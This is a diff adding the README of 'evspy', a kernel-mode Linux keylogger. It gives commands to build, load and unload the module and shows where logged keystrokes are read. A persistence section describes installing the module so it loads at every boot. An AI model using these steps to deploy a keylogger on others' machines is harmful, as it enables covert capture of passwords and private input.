@@ -1,0 +1,47 @@
+** INTRO **
+
+Evspy is a general purpose kernel-mode keylogger in (early) development stage.
+
+The file from where you can read the registered keystrokes is /proc/driver/evspy
+by default. Only root can read it. Beware users: evspy can troll you.
+
+Don't be evil.
+
+
+** COMPILE **
+
+	$ make
+
+
+** LOAD **
+
+	# insmod evspy.ko
+
+
+** UNLOAD **
+
+	# rmmod evspy
+
+
+** IS IT ALREADY LOADED? **
+
+	$ lsmod | grep evspy
+
+
+** PERSISTENCE **
+
+If you want evspy to be loaded every time system boots, copy it into your
+kernel module dir:
+
+	# cp evspy.ko /lib/modules/$(uname -r)/kernel/drivers/input/evspy.ko
+
+and update module database:
+
+	# depmod -a
+
+(In some distros it could also be necessary to add it to some rc/config file)
+
+Once it has been installed, you can load it when you want with
+
+	# modprobe evspy
+
